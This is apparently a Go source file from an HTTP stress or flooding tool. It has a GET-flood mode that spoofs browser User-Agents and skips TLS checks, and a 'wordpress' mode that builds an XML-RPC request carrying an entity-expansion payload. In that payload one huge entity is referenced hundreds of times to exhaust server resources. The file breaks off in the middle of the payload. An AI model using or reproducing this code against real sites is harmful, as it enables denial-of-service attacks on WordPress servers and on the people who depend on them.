package library

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

type StressRequests struct {
	URL  string
	Mode string
}

func (s *StressRequests) Execute(threadNumber int, packageNumber int) {
	switch s.Mode {
	case "wordpress":
		s.wordpressRequest(s.URL, threadNumber, packageNumber)
	case "normal":
		s.defaultGETRequest(s.URL, threadNumber, packageNumber)
	default:
		log.Println("Not supported")
		os.Exit(1)
	}
}

func (s *StressRequests) defaultGETRequest(url string, threadNumber int, packageNumber int) {
	// Create an HTTP client
	client := &http.Client{}

	// If the protocol is https, skip SSL verification
	if len(url) > 5 && url[0:5] == "https" {
		// Warning: This skips SSL/TLS verification for the https request
		// It's insecure and should not be used in production environments
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client.Transport = tr
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}

	// Set User-Agent to mimic browser
	req.Header.Set("User-Agent", giveRandomUserAgentString())

	// Create and execute the GET request
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("package with thread %d and seq %d: %v", threadNumber, packageNumber, err)
	} else {
		log.Printf("package with thread %d and seq %d: %d\n", threadNumber, packageNumber, resp.StatusCode)
	}
}

func (s *StressRequests) wordpressRequest(url string, threadNumber int, packageNumber int) {
	// Create an HTTP client
	client := &http.Client{}

	// If the protocol is https, skip SSL verification
	if len(url) > 5 && url[0:5] == "https" {
		// Warning: This skips SSL/TLS verification for the https request
		// It's insecure and should not be used in production environments
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client.Transport = tr
	}

	dataXML := []byte(`
	<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
		<!ENTITY poc "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
	]>
	<methodCall>
		<methodName>aaa&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&